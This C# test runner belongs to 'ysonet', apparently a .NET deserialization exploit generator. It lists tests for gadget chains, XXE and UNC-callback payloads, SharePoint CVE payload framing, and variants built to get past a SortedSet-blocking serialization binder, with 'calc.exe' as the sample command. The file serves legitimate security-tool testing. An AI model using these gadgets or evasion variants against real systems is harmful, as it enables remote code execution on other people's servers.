using NDesk.Options;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using ysonet.Generators;
using ysonet.Helpers;
using ysonet.Helpers.Core;
using ysonet.Interactive;
using ysonet.Plugins;

namespace ysonet.Tests
{
    // Self-contained test runner. No external test framework, so there is no new
    // NuGet dependency (the dependency freshness policy stays satisfied). Each
    // Check reports pass/fail; the process exits non-zero if anything failed.
    internal class Tests
    {
        private static int _passed = 0;
        private static int _failed = 0;

        // Opt-in: allow the suite to actually BUILD a denial-of-service payload.
        // Off by default, so no tier of this suite ever generates one, and no test
        // has to pass an acknowledgement to do its job: the DoS gadgets are simply
        // left out of every sweep and the containment test checks the refusal
        // instead. A maintainer who wants the generation half runs the suite with
        // the --dos argument or the YSONET_DOS_TESTS env var. Nothing here ever
        // deserializes such a payload; the fire helpers refuse one outright.
        private static bool _dosGenerationAllowed = false;

        private static int Main(string[] args)
        {
            if (Environment.GetEnvironmentVariable("YSONET_DUMPUI") != null) { DumpUi(); return 0; }
            // Hidden self-spawned probe: deserialize one XAML-container payload and exit.
            // XamlContainersEvadeSortedSetBinder runs it in a child process because firing the
            // XAML wrapper in-process can fail-fast the CLR (see that test).
            string containerProbe = Environment.GetEnvironmentVariable(XamlContainerProbeVar);
            if (containerProbe != null) return XamlContainerProbe(containerProbe);
            _dosGenerationAllowed = Array.IndexOf(args, "--dos") >= 0
                || Environment.GetEnvironmentVariable("YSONET_DOS_TESTS") != null;
            SweepStaleTestArtifacts();

            // OOB tier (opt-in, separate): out-of-band callback observation. These are
            // the only tests that send anything off this machine, so they never run in
            // NORMAL or FULL. They exist for an effect an in-process loopback listener
            // cannot see - the SMB/UNC callback, where SMB is fixed at port 445 and the
            // Windows SMB client owns the loopback UNC path. Enable with the --oob arg
            // or the YSONET_OOB_TESTS env var. They need interactsh-client; install it
            // with tools\interactsh\get-interactsh.ps1 (see that folder's README for the
            // self-hosted server option). Without the client, every row logs a clear
            // skip reason instead of failing.
            //
            // They run FIRST, before the local tiers, on purpose: they are network
            // bound and depend on nothing the other tests set up, so their result should
            // not sit behind minutes of unrelated local rows (a wedged compile in the
            // NORMAL tier would otherwise hide it completely).
            if (Array.IndexOf(args, "--oob") >= 0
                || Environment.GetEnvironmentVariable("YSONET_OOB_TESTS") != null)
            {
                Console.Error.WriteLine("---- OOB tier (out-of-band callback observation) ----");
                Run("UNC short-name expansion calls out (a plain UNC path does not)", UncShortNameExpansionIsObservedOutOfBand);
                Run("UNC-callback gadgets are observed out of band", UncCallbackGadgetsAreObservedOutOfBand);
                Console.Error.WriteLine();
            }

            Run("Test artifact directories are tried in the documented order", TestArtifactDirOrdering);
            Run("Artifact write falls through blocked and AV-deleted locations", TestArtifactWriteFallsThrough);
            Run("Stale test artifacts are swept, live ones kept", StaleArtifactSweep);
            Run("Picker.Filter ranks exact, prefix, contains", PickerFilterRanking);
            Run("Picker.Filter empty query returns all", PickerFilterEmpty);
            Run("Picker.Filter no match returns empty", PickerFilterNoMatch);
            Run("OptionField introspects a gadget OptionSet", OptionFieldIntrospection);
            Run("OptionField flag vs value ToArgv", OptionFieldToArgv);
            Run("CommandEcho quotes and builds", CommandEchoBuild);
            Run("CommandEcho gadget tokens shape", CommandEchoGadgetTokens);
            Run("PayloadRunner.Encode base64/hex", EncodeFormats);
            Run("PayloadRunner.GenerateGadget is deterministic", GenerateDeterministic);
            Run("Plugin argv rebuild matches CLI output", PluginArgvRebuild);
            Run("Every global option is surfaced or excluded", OptionCompleteness);
            Run("CliListing lists gadgets, plugins, formatters, options", CliListingBasics);
            Run("CliListing narrows to a gadget's formatters and options", CliListingPerModule);
            Run("UpdateChecker.NormalizeVersion strips repo prefix and v", UpdateCheckerNormalize);
            Run("UpdateChecker.LooksLikeVersion accepts only dotted numerics", UpdateCheckerLooksLikeVersion);
            Run("UpdateChecker.CompareVersions is numeric and prefix-tolerant", UpdateCheckerCompares);
            Run("UpdateChecker.TryParseRelease reads tag/url and rejects junk", UpdateCheckerParsesRelease);
            Run("UpdateChecker.Check reports update/uptodate/ahead events", UpdateCheckerCheckEvents);
            Run("UpdateChecker.Check reports unreachable and unparseable errors", UpdateCheckerCheckErrors);
            Run("UpdateChecker.Check picks the release url and echoes current", UpdateCheckerCheckUrlAndCurrent);
            Run("PowerShell completion script covers every CLI option", CompletionScriptCoversOptions);
            Run("PowerShell completion script value lists match the tool", CompletionScriptValueLists);
            Run("Completion script is embedded in the exe", CompletionScriptEmbedded);
            Run("Completion profile block installs idempotently and uninstalls", CompletionProfileBlock);
            Run("Completion shell classifier recognizes shells", CompletionShellClassifier);
            Run("Completion policy classifier flags signing-required policies", CompletionPolicyClassifier);
            Run("Menu navigates with arrows and Enter", MenuNavigation);
            Run("Menu digit shortcut and Escape cancel", MenuDigitAndCancel);
            Run("Picker selects by typing and cancels on Esc", PickerShowSelectAndCancel);
            Run("Menu redraws in place in a real console", MenuRedrawsInPlace);
            Run("Menu shows numbers and a key hint", MenuShowsNumbersAndHint);
            Run("Wizard e2e builds the same payload as the core", WizardEndToEnd);
            Run("Wizard advanced options reach the payload", WizardAdvancedOptions);
            Run("Wizard writes to a file, not stdout", WizardOutputToFile);
            Run("Wizard cancel at the picker emits nothing", WizardCancelAtPicker);
            Run("Esc at a text prompt goes back, no payload", WizardEscAtTextPrompt);
            Run("Wizard plugin path matches the core", WizardPluginPath);
            Run("Gadgets declare their command-input type", CommandInputTypes);
            Run("Ignored-command gadget needs no -c and hides those fields", IgnoredCommandGadget);
            Run("Gadgets declare their variants", GadgetsDeclareVariants);
            Run("Variants can declare their own command-input type", VariantInputTypes);
            Run("Variant formatter opt-out narrows first-token, case-insensitive", VariantFormatterOptOutDataModel);
            Run("Affected gadgets opt a variant out of SoapFormatter (union kept)", VariantFormatterOptOutWiring);
            Run("Editor blocks a variant+formatter mismatch at generate", EditorBlocksVariantFormatterMismatch);
            Run("Guard rejects variant+formatter mismatch on the non-UI path", GuardBlocksVariantFormatterOnNonUiPath);
            Run("DataTable implicit default equals explicit variant 1 (byte-for-byte)", DataTableDefaultEqualsVariantOne);
            Run("TypeConfuseDelegate implicit default equals explicit variant 1 (byte-for-byte)", TypeConfuseDelegateDefaultEqualsVariantOne);
            Run("TypeConfuseDelegate rejects a variant outside 1-3", TypeConfuseDelegateVariantOptionIsValidated);
            Run("TypeConfuseDelegate container variants drop the SortedSet wire name", TypeConfuseDelegateVariantRootsAvoidSortedSetName);
            Run("TypeConfuseDelegate variants 2/3 fire through a SortedSet-blocking binder", TypeConfuseDelegateVariantsEvadeSortedSetBinder);
            Run("TypeConfuseDelegate variants 2/3 need distinct command and argument strings", TypeConfuseDelegateVariantKeyEdgeCases);
            Run("TypeConfuseDelegate containers are all generic, so SoapFormatter stays impossible", TypeConfuseDelegateContainersCannotUseSoapFormatter);
            Run("An outer gadget's --variant does not reach its inner TypeConfuseDelegate", OuterVariantDoesNotReachTheInnerTypeConfuseDelegate);
            Run("Editor offers the TypeConfuseDelegate container labels and emits the number", EditorExposesTypeConfuseDelegateContainerVariants);
            Run("The shared container builder keeps every original TypeConfuseDelegate graph", TypeConfuseDelegateSharedBuilderKeepsTheOriginalGraphs);
            Run("TypeConfuseDelegate notes a swapped --rawcmd split in debug mode only", TypeConfuseDelegateNotesSwappedArgumentsInDebugOnly);
            Run("File operations serialize an ordinal comparer and the real file sink", FileOperationsSerializeAnOrdinalComparerAndTheRealSink);
            Run("File operations order arguments ordinally, not by the operator's culture", FileOperationsOrderingIsOrdinalNotCultural);
            Run("File operations refuse an order the primitive cannot represent", FileOperationsRefuseAnImpossibleOrder);
            Run("File operations split -c on the first ';' and keep both fields verbatim", FileOperationsParseTheCommandStrictly);
            Run("File operations embed the local content file at generation time", FileOperationsWriteEmbedsTheLocalFileAtGenerationTime);
            Run("File operations validate the variant and root container selectors", FileOperationsOptionsAreValidated);
            Run("File operation root containers swap only the serialized root", FileOperationsRootContainersSwapOnlyTheRoot);
            Run("File operation containers are generic, so SoapFormatter stays impossible", FileOperationsCannotUseSoapFormatter);
            Run("File operations refuse a --minify that would rewrite the delivered text", FileOperationsRefuseLossyMinification);
            Run("File operation target paths resolve on the target, not in ysonet", FileOperationsTargetPathsAreRelativeToTheTarget);
            Run("Editor offers the five file operations and the root container option", EditorExposesTheFileOperationVariants);
            Run("DataViewManagerXxe carries the real setter, DOCTYPE and URL on every formatter", DataViewManagerXxeCarriesTheRealCarrierAndDoctype);
            Run("DataViewManagerXxe validates the DTD URL and allows query strings", DataViewManagerXxeValidatesTheDtdUrl);
            Run("DataViewManagerXxe --minify keeps the DOCTYPE and the parameter entity", DataViewManagerXxeMinifyKeepsTheDoctype);
            Run("DataViewManagerXxe declares a remote URL input and a network kind", DataViewManagerXxeDeclaresUrlInputAndNetworkKind);
            Run("DataViewManagerXxe advertises only setter-calling formatters", DataViewManagerXxeAdvertisesOnlySetterFormatters);
            Run("AssemblyInstallerLoad carries the loader chain on every formatter and carrier", AssemblyInstallerLoadCarriesTheRealChain);
            Run("AssemblyInstallerLoad validates the DLL path, the variant and the carrier", AssemblyInstallerLoadValidatesTheDllPath);
            Run("AssemblyInstallerLoad delivers an awkward path unchanged on every formatter", AssemblyInstallerLoadEscapesOperatorPaths);
            Run("AssemblyInstallerLoad declares a local and a UNC capability", AssemblyInstallerLoadDeclaresItsVariantFacets);
            Run("AssemblyInstallerLoad refuses -t before it touches the path", AssemblyInstallerLoadRefusesSelfTest);
            Run("AssemblyInstallerLoad generation never loads the DLL", AssemblyInstallerLoadGenerationIsInert);
            Run("AssemblyInstallerLoad info panel still shows its facts", AssemblyInstallerLoadInfoPanelStillShowsItsFacts);
            Run("TempFileCollection rebuilds the real type and its four delete fields", TempFileCollectionCarriesTheRealTypeAndFields);
            Run("TempFileCollection collects -c plus repeated --extrafile and touches no path", TempFileCollectionOptionParsing);
            Run("TempFileCollection keeps UNC and relative target paths verbatim", TempFileCollectionKeepsUncAndRelativePathsVerbatim);
            Run("TempFileCollection refuses -t before anything can construct the target", TempFileCollectionRefusesSelfTest);
            Run("TempFileCollection refuses a target path it would rewrite", TempFileCollectionRefusesAPathItWouldRewrite);
            Run("TempFileCollection info panel still shows its formatters, input and categories", TempFileCollectionInfoPanelStillShowsItsFacts);
            Run("XAML root container: no option equals --rootcontainer 1 (byte-for-byte)", XamlContainerDefaultEqualsContainerOne);
            Run("XAML root container rejects a value outside 1-3", XamlContainerOptionIsValidated);
            Run("XAML root containers 2/3 drop the SortedSet wire name", XamlContainerRootsAvoidSortedSetName);
            Run("XAML root containers 2/3 parse their XAML through a SortedSet-blocking binder", XamlContainersEvadeSortedSetBinder);
            Run("XAML root container is accepted and ignored by the TextFormattingRunProperties wrapper", XamlContainerIsIgnoredByTheTfrpWrapper);
            Run("XAML root containers are all generic, so SoapFormatter stays impossible", XamlContainersCannotUseSoapFormatter);
            Run("Editor offers the XAML root container as a plain option, not a variant", EditorExposesTheXamlContainerOption);
            Run("A variant can declare gadget options it does not use", VariantOptionScopeDataModel);
            Run("Editor hides (and stops emitting) an option the selected variant does not use", EditorHidesAnOptionTheVariantDoesNotUse);
            Run("The XAML wrapper self-test runs in a child process and leaves the host alive", XamlWrapperSelfTestSurvivesTheHostProcess);
            Run("An isolated self-test refuses a gadget with its own SerializationBinder", IsolatedSelfTestRefusesACustomBinder);
            Run("Every gadget variant generates from the variant flag alone", EveryVariantGeneratesFromTheVariantFlagAlone);
            Run("GenericIdentity carries the derived root type and inherited-field name", GenericIdentityCarriesDerivedType);
            Run("FormsIdentity BinaryFormatter fires under AssemblyFormat=Full", FormsIdentityFiresUnderFullAssemblyMode);
            Run("DataContractJsonSerializer fires for the ClaimsIdentity family", DataContractJsonFiresForClaimsFamily);
            Run("Option heuristics recover choices/default/required", OptionHeuristics);
            Run("Editor builds plugin fields with defaults and a gadget picker", EditorPluginFields);
            Run("Editor exposes actions and marks module-own options", EditorActionsAndOwnership);
            Run("Choice options are detected (modes, colon lists, numbered)", ChoiceDetection);
            Run("Bridged-chain setting offers bridge gadgets", BridgedChainChoices);
            Run("Switching variant resets a stale, wrong-type command", VariantSwitchResetsCommand);
            Run("Changed settings persist across modules; reset restores defaults", OptionsPersistAndReset);
            Run("A single setting resets to its default (Delete / menu entry)", SingleFieldResetToDefault);
            Run("Bridged-chain setting is shown only for bridge gadgets", BridgedChainShownOnlyForBridgeGadgets);
            Run("A typed command persists across gadget switches (not only on generate)", CommandPersistsAcrossGadgets);
            Run("Shared settings carry from a gadget to a plugin", SettingsSharedGadgetToPlugin);
            Run("Themes apply and are named", ThemeApply);
            Run("Conditional plugin options are not marked required", ConditionalRequired);
            Run("ViewState missing-payload error names the options to set", ViewStateModeErrorIsActionable);
            Run("Informational plugin options (examples) are hidden from the editor", ExamplesHiddenFromEditor);
            Run("Plugin modes drive which settings show, are required, and are passed", PluginModesDriveOptions);
            Run("DotNetNuke modes select the payload mode and pass the right args", DotNetNukeModes);
            Run("Clipboard modes scope format vs xamlvariant per mode", ClipboardModes);
            Run("Xps modes choose which markup part carries the payload", XpsModes);
            Run("SharePoint modes select the CVE and scope its inner setting", SharePointModes);
            Run("SharePoint CVE-2026-50522 default output is the wresult token plus a delivery comment", SharePointCve2026Framing);
            Run("SharePoint CVE-2026-50522 --formbody emits the full wa/wctx/wresult body", SharePointCve2026FormBody);
            Run("SharePoint CVE-2026-50522 validates its target and gadget inputs", SharePointCve2026Validation);
            Run("SharePoint --no-comment suppresses the explanatory comment", SharePointNoComment);
            Run("SharePoint honors --rawcmd instead of hardcoding it", SharePointRawcmdConfigurable);
            Run("ApplicationTrust --no-comment outputs clean XML", ApplicationTrustNoComment);
            Run("Command plugins expose --rawcmd (and SharePoint --minify/--ust/--no-comment)", CommandPluginsExposeConfigFlags);
            Run("A space sets an explicit empty string, distinct from unset", ExplicitEmptyStringViaSpace);
            Run("Interactive banner marks beta and shows the version", BannerShowsBetaAndVersion);
            Run("Show-command action prints the one-liner without generating", WizardShowCommand);
            Run("Generate and quit emits the payload and exits", WizardGenerateAndQuit);
            Run("Columns render in a virtual terminal (layout + per-cell highlight)", ColumnsRenderInVirtualTerminal);
            Run("Typing filters the module list by substring", ColumnFilterNarrowsModules);
            Run("Typing filters the settings list by substring", ColumnFilterNarrowsSettings);
            Run("Module info panel shows facts while choosing a module", ModuleInfoPanelShowsFacts);
            Run("FilterFields keeps substring matches and keeps order", FilterFieldsUnit);
            Run("Help/description text is shown sentence-cased", SentenceCasingUnit);
            Run("Every top menu screen renders in a virtual terminal", AllMenusRender);
            Run("Text editor pre-fills and appends on type (no wipe)", TextEditAppends);
            Run("Text editor caret moves and edits in place (Left/Home/Delete)", TextEditCaretEditing);
            Run("Text editor word ops (Ctrl+Backspace, Ctrl+Left)", TextEditWordOps);
            Run("Text editor wraps a long value in place across rows", TextEditWrapsInPlace);
            Run("A focused setting's full value shows in the footer for copying", FocusedValueInFooter);
            Run("LineEditBuffer inserts, deletes words, clears, and clamps the caret", LineEditBufferUnit);
            Run("Generate is blocked (not an exit) when required settings are empty", WizardBlocksMissingRequired);
            Run("Blocked report enumerates every missing required setting", BlockedReportEnumeratesMissing);
            Run("Blocked report shows the command's expected input and example", BlockedReportShowsCommandExample);
            Run("Home/End jump to first/last setting in the columns", ColumnsHomeEndNav);
            Run("Picker Home/End jump to first/last match", PickerHomeEnd);
            Run("Picker fits a short window (no stacking/overflow)", PickerFitsShortWindow);
            Run("Fallback clears the top menu before the picker on a short window", FallbackClearsTopMenuOnShortWindow);
            Run("Fallback settings form clears the module preview residual", FallbackFormClearsModulePreview);
            Run("Fallback settings form clears the field-editor residual", FallbackFormClearsEditResidual);
            Run("Wizard remembers the last command", WizardRemembersLastCommand);
            Run("Run-all-formatters survives file/url gadgets", WizardRunAllFormatters);
            Run("Run-all-formatters saves payloads to a folder", WizardRunAllFormattersToFolder);
            Run("Clipboard plugin exposes the wpfxaml mode options", ClipboardWpfXamlOptions);
            Run("Clipboard payloads actually trigger (winforms + wpfxaml variants)", ClipboardPayloadsTrigger);
            Run("Restrictive XAML load blocks the ObjectDataProvider gadget", RestrictiveXamlBlocksGadget);
            Run("Xps builds a real XPS package with the payload in the chosen part", XpsPackageStructure);
            Run("Xps rejects an unknown part mode and an empty command", XpsRejectsBadInput);
            Run("Xps options do not leak between in-process runs", XpsOptionsDoNotLeak);
            Run("Option help renders without hanging for every plugin and gadget", OptionHelpNeverHangs);
            Run("SoftBreak wraps over-long help tokens (NDesk hang guard)", SoftBreakWrapsLongTokens);
            Run("XmlMinifier strips soap encodingStyle without O(n^2) backtracking", XmlMinifierEncodingStyle);
            Run("XmlMinifier scales linearly on a big inline-assembly payload", XmlMinifierScalesOnBigPayload);
            Run("XmlMinifier dirty-match pass scales on a big hex attribute", XmlMinifierDirtyMatchScalesOnHexAttribute);
            Run("XmlMinifier dirty-match pass output is unchanged by the guard+lookbehind fix", XmlMinifierDirtyMatchOutputUnchanged);
            Run("XmlMinifier trims the leading space of a generic type's outer assembly", XmlMinifierTrimsLeadingSpaceInGenericTypeName);
            Run("XmlMinifier removes a namespace orphaned by a discardable regex (guarded)", XmlMinifierRemovesNamespaceOrphanedByDiscard);
            Run("Byte-array encoder emits the compact bare <Byte> tag", ByteArrayEncoderEmitsBareTag);
            Run("GetterSettingsPropertyValue Xaml uses the compact byte array", GspvXamlUsesCompactByteArray);
            Run("GetterSettingsPropertyValue Xaml is minified with --minify", GspvXamlMinifies);
            Run("DataSetOldBehaviourFromFile --compressed shrinks via a GZip payload chain", DataSetFromFileCompressedIsSmaller);
            Run("Non-RCE payloads are first-class gadgets with accurate inputs and facets", NonRcePayloadsAreGadgets);
            Run("Non-RCE gadget payloads are minified with --minify", NonRcePayloadsMinify);
            Run("MessagePack Typeless payloads carry the target type names, not the surrogates'", MessagePackTypelessCarriesTargetTypeNames);
            Run("Every gadget generates a non-empty payload from valid inputs", EveryGadgetGeneratesAPayload);
            Run("Every safe plugin generates a payload; the rest are explicitly excluded", EverySafePluginGeneratesAPayload);

            // ---- Denial-of-service category and its safeguards ----
            Run("DoS policy detects the facet on a gadget and on a single variant", DosPolicyDetectsVariantLevelFacet);
            Run("DoS policy reads facets the same way the capability expansion does", DosPolicyAgreesWithFacetExpansion);
            Run("DoS refusal names the acknowledgement flag", DosRefusalMessageNamesTheFlag);
            Run("DoS warning states the risk and keeps the gadget's own details", DosWarningTextIsActionable);
            Run("DoS acknowledgement survives DeepCopy and stays out of the gadget args", DosAcknowledgementSurvivesInputArgsCopy);
            Run("The generator wrapper refuses a DoS gadget without the acknowledgement", GenericGeneratorRefusesDosWithoutAcknowledgement);
            Run("The shared bulk partition excludes every DoS gadget and nothing else", DosBulkPartitionExcludesEveryDosGadget);
            Run("The equivalent command carries the acknowledgement once, never as a gadget option", DosAcknowledgementCommandEcho);
            Run("The acknowledgement field is offered only for a DoS selection", DosAcknowledgementFieldFollowsSelections);
            Run("Every registered DoS gadget is contained (refused, warned, out of bulk)", DosGadgetsAreContained);

            // ---- Category facets (metadata + discovery) ----
            Run("Facet vocabulary is broad, unique, and labelled", FacetVocabularyIsBroadAndValid);
            Run("Every gadget expands to normalized capability units", EveryGadgetExpandsToCapabilities);
            Run("Default facets are honest (uncategorized + unspecified + derived input)", DefaultFacetsAreHonest);
            Run("Runtime version vocabulary is ordered, unique, and labelled", VersionVocabularyIsOrderedAndValid);
            Run("Runtime version ranges expand and refuse bad pairs", VersionRangeExpandsAndGuards);
            Run("Runtime version input resolves the forms users type", VersionResolveAcceptsUserForms);
            Run("Version support is declared only where it is evidenced", VersionSupportIsEvidenced);
            Run("Variant overrides keep the gadget's runtime versions", VariantOverridesKeepTheirVersions);
            Run("Version summary collapses a declared range", VersionSummaryCollapsesRanges);
            Run("Input derivation covers all CommandInputType values", InputDerivationCoversCommandInputTypes);
            Run("Explicit inputs replace the derived input", ExplicitInputsReplaceDerivedInput);
            Run("Uncategorized cannot mix with a real value; unknowns rejected", UncategorizedCannotMix);
            Run("Variant facets inherit or fully override the gadget set", VariantFacetInheritanceAndOverride);
            Run("Variant formatter exclusions reach capability units", VariantFormatterAndInputAreEffective);
            Run("One capability must satisfy every axis (no cross-variant match)", OneCapabilityMustMatchAllAxes);
            Run("Multiple values OR within an axis; axes AND across", MultipleValuesUnionAndAxesIntersection);
            Run("Representative gadget facets are locked (audit table)", ExistingFacetAudit);
            Run("Category query parses all axes case-insensitively", CategoryQueryParsesAllAxes);
            Run("Category query rejects malformed values with guidance", CategoryQueryRejectsMalformedValues);
            Run("Category query collapses duplicates", CategoryQueryCombinesSelections);
            Run("Program.options collects repeated --category values", CategoryOptionParsesRepeated);
            Run("Filtered gadget list is sorted machine-readable names", FilteredGadgetListIsMachineReadable);
            Run("Unfiltered gadget list is unchanged by the overload", UnfilteredGadgetListIsUnchanged);
            Run("Category search shows matching units and reports no matches", CategoryCommandShowsMatchingUnitsAndNoMatches);
            Run("Category CLI dispatch: search, list, and mode rejection", CategoryCliDispatch);
            Run("Help shows compact and detailed categories", HelpShowsCategories);

            // ---- Interactive category filter ----
            Run("Filter model: default all, union, intersection, counts", CategoryFilterModelBehaviors);
            Run("Filter driver selects a value and persists it in the session", CategoryFilterDriverSelectsAndPersists);
            Run("Filter driver Esc discards the axis draft", CategoryFilterEscDiscardsAxisDraft);
            Run("Filter driver Clear all resets selections", CategoryFilterClearAll);
            Run("Filter disables values impossible under other axes", CategoryFilterDisablesImpossibleValues);
            Run("Filter screen does not stack on a real console (redraw in place)", CategoryFilterDoesNotStack);
            Run("Gadget preview shows the category summary", ModuleViewShowsCategorySummary);
            Run("In-build gadget filter narrows the list and resets", GadgetFilterNarrowsAndResets);
            Run("In-build category filter narrows the picker and generates the same payload", CategoryFilterInBuildGeneratesSamePayload);
            Run("Plugin flow has no category screen", PluginFlowHasNoCategoryScreen);
            Run("Existing gadget flow reaches the picker with the filter action offered", ExistingGadgetFlowReachesPickerDirectly);

            // FULL tier (opt-in): the exhaustive combination suite. It is slower and
            // flashes many self-closing cmd windows / binds loopback sockets, so it
            // never runs on a normal Debug build. Enable it with the --full arg or the
            // YSONET_FULL_TESTS env var (the post-build <Exec> inherits the env var).
            bool full = Array.IndexOf(args, "--full") >= 0
                || Environment.GetEnvironmentVariable("YSONET_FULL_TESTS") != null;
            if (full)
            {
                Console.Error.WriteLine();
                Console.Error.WriteLine("---- FULL tier (exhaustive combination suite) ----");
                // The build every fire below happens on. It is the evidence behind the
                // runtime version facet, so name it once, up front, in the log.
                Console.Error.WriteLine("Runtime: " + RuntimeBuild.Describe());
                Run("Every gadget x formatter x variant generates (x minify)", GadgetFullMatrixGenerates);
                Run("XAML container x formatter x minify generates for both consumers", XamlContainerFullMatrix);
                Run("Payloads fire into test-owned sinks (marker/listener/tempdir/self-cs)", PayloadsFireIntoTestSinks);
                // Must follow the matrix: it reads what that matrix just fired.
                Run("Runtime version claims match what fired on this build", VersionEvidenceMatchesThisRuntime);
                Run("Output encodings correct per formatter (representative gadgets)", OutputEncodingPerFormatter);
                Run("Bridged gadget chains (--bgc) generate for every consumer", BridgedChainsGenerate);
                Run("Bridged chains propagate --minify to the whole chain (raw vs min)", BridgedChainsMinifyPropagates);
                Run("WindowsPrincipal bridge generates, minifies, and fires for every formatter", WindowsPrincipalBridgeEveryFormatter);
                Run("Every plugin mode/CVE/inner-gadget generates (x minify)", PluginFullMatrixGenerates);
            }

            Console.Error.WriteLine();
            Console.Error.WriteLine("Passed: " + _passed + "  Failed: " + _failed);
            return _failed == 0 ? 0 : 1;
        }

        // ---- individual tests --------------------------------------------------

        private static void PickerFilterRanking()
        {
            var items = new List<string> { "Beta", "AlphaBeta", "Alpha" };
            var r = Picker.Filter(items, "alpha");
            AssertEqual(2, r.Count, "count");
            AssertEqual("Alpha", r[0], "exact first");
            AssertEqual("AlphaBeta", r[1], "prefix/contains second");
        }

        private static void PickerFilterEmpty()
        {
            var items = new List<string> { "a", "b", "c" };
            var r = Picker.Filter(items, "");
            AssertEqual(3, r.Count, "returns all");
        }

        private static void PickerFilterNoMatch()
        {
            var items = new List<string> { "a", "b" };
            var r = Picker.Filter(items, "zzz");
            AssertEqual(0, r.Count, "no match");
        }

        private static void OptionFieldIntrospection()
        {
            IGenerator g = GadgetRegistry.CreateGadgetInstance("ObjectDataProvider");
            AssertTrue(g != null, "gadget loads");
            var fields = OptionField.FromOptionSet(g.Options());
            // ObjectDataProvider has var|variant= and xamlurl=
            AssertEqual(2, fields.Count, "two options");
            OptionField variant = FindField(fields, "variant");
            OptionField xamlurl = FindField(fields, "xamlurl");
            AssertTrue(variant != null, "variant field present");
            AssertTrue(xamlurl != null, "xamlurl field present");
            AssertTrue(variant.TakesValue, "variant takes a value");
            // var|variant has no single-char alias, so ShortName is null.
            AssertTrue(variant.ShortName == null, "variant has no single-char short name");
            AssertTrue(!string.IsNullOrEmpty(variant.Description), "variant has help text");

            // A single-char alias is captured as ShortName.
            OptionSet withShort = new OptionSet { { "p|plugin=", "the plugin", v => { } } };
            OptionField pf = FindField(OptionField.FromOptionSet(withShort), "plugin");
            AssertEqual("p", pf.ShortName, "single-char short name captured");
        }

        private static void OptionFieldToArgv()
        {
            bool flag = false;
            string val = null;
            OptionSet set = new OptionSet
            {
                { "minify", "a flag", v => flag = v != null },
                { "var|variant=", "a value", v => val = v }
            };
            var fields = OptionField.FromOptionSet(set);

            OptionField f = FindField(fields, "minify");
            OptionField v2 = FindField(fields, "variant");

            AssertTrue(f.IsFlag, "minify is a flag");
            AssertEqual(0, f.ToArgv().Count, "unset flag emits nothing");
            f.Value = "true";
            var flagArgv = f.ToArgv();
            AssertEqual(1, flagArgv.Count, "set flag emits one token");
            AssertEqual("--minify", flagArgv[0], "flag token");

            AssertEqual(0, v2.ToArgv().Count, "unset value emits nothing");
            v2.Value = "2";
            var valArgv = v2.ToArgv();
            AssertEqual(2, valArgv.Count, "set value emits two tokens");
            AssertEqual("--variant", valArgv[0], "value flag");
            AssertEqual("2", valArgv[1], "value");
        }

        private static void CommandEchoBuild()
        {
            AssertEqual("plain", CommandEcho.Quote("plain"), "no quote needed");
            AssertEqual("\"a b\"", CommandEcho.Quote("a b"), "space quoted");
            AssertEqual("\"\"", CommandEcho.Quote(""), "empty quoted");
            var tokens = new List<string> { "-g", "ObjectDataProvider", "-c", "a b" };
            string line = CommandEcho.Build(tokens);
            AssertEqual("ysonet.exe -g ObjectDataProvider -c \"a b\"", line, "built line");
        }

        private static void CommandEchoGadgetTokens()
        {
            var tokens = CommandEcho.GadgetTokens(
                "ObjectDataProvider", "Json.NET", "calc.exe",
                false, false, "", "", "", false, false, false, false, null);
            string line = CommandEcho.Build(tokens);
            AssertTrue(line.StartsWith("ysonet.exe -g ObjectDataProvider -f Json.NET -c calc.exe"),
                "gadget command shape: " + line);
        }

        private static void EncodeFormats()
        {
            int len;
            byte[] b64 = PayloadRunner.Encode("abc", "base64", out len);
            AssertEqual("YWJj", Encoding.ASCII.GetString(b64), "base64 of abc");

            byte[] hex = PayloadRunner.Encode(new byte[] { 0x01, 0xff }, "hex", out len);
            AssertEqual("01FF", Encoding.ASCII.GetString(hex), "hex of bytes");

            byte[] raw = PayloadRunner.Encode("hello", "raw", out len);
            AssertEqual("hello", Encoding.UTF8.GetString(raw), "raw string");
        }

        private static void GenerateDeterministic()
        {
            byte[] a = GenerateOdpJson("calc.exe");
            byte[] b = GenerateOdpJson("calc.exe");
            AssertTrue(a != null && a.Length > 0, "payload produced");
            AssertTrue(BytesEqual(a, b), "same inputs give same bytes");
        }

        private static void PluginArgvRebuild()
        {
            // Rebuild argv the way the wizard does and confirm the plugin runs.
            var argv = new List<string> { "-p", "ApplicationTrust", "-c", "calc.exe" };
            RunResult r = PayloadRunner.RunPlugin("ApplicationTrust", argv.ToArray());
            AssertTrue(r.Success, "plugin ran: " + r.ErrorMessage);
            AssertTrue(r.Raw != null, "plugin produced output");
        }

        private static void OptionCompleteness()
        {
            var fields = OptionField.FromOptionSet(ysonet.Program.options);
            AssertTrue(fields.Count > 0, "global options readable");

            var covered = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            foreach (string s in Wizard.SurfacedGlobalOptions) covered.Add(s);
            foreach (string s in Wizard.NonPayloadGlobalOptions) covered.Add(s);

            foreach (OptionField f in fields)
            {
                AssertTrue(covered.Contains(f.Name),
                    "global option '" + f.Name + "' must be surfaced or explicitly excluded");
            }
        }

        private static void CliListingBasics()
        {
            var gadgets = CliListing.Gadgets();
            var plugins = CliListing.Plugins();
            var formatters = CliListing.Formatters();
            var options = CliListing.OptionTokens(ysonet.Program.options);

            AssertTrue(gadgets.Count > 10, "several gadgets listed");
            AssertTrue(plugins.Count > 5, "several plugins listed");
            AssertTrue(formatters.Count > 5, "several formatters listed");
            AssertTrue(options.Count > 10, "several option tokens listed");

            // "Generic" is an internal placeholder and must never be offered.
            AssertTrue(!gadgets.Contains("Generic"), "gadgets exclude Generic");
            AssertTrue(!plugins.Contains("Generic"), "plugins exclude Generic");

            // A few well-known values must be present.
            AssertTrue(gadgets.Contains("ObjectDataProvider"), "ObjectDataProvider listed");
            AssertTrue(formatters.Contains("BinaryFormatter"), "BinaryFormatter listed");
            AssertTrue(formatters.Contains("Json.NET"), "Json.NET listed (dot kept)");
            // Variant annotations must be cleaned off in the global formatter list.
            AssertTrue(!formatters.Contains("Xaml (4)"), "no annotated formatter names");
            AssertTrue(formatters.Contains("Xaml"), "Xaml listed cleanly");

            AssertTrue(options.Contains("-g") && options.Contains("--gadget"), "gadget option tokens present");
            AssertTrue(options.Contains("--list"), "list option token present");
        }

        private static void CliListingPerModule()
        {
            var odpFormatters = CliListing.GadgetFormatters("ObjectDataProvider");
            AssertTrue(odpFormatters.Count > 3, "gadget reports its formatters");
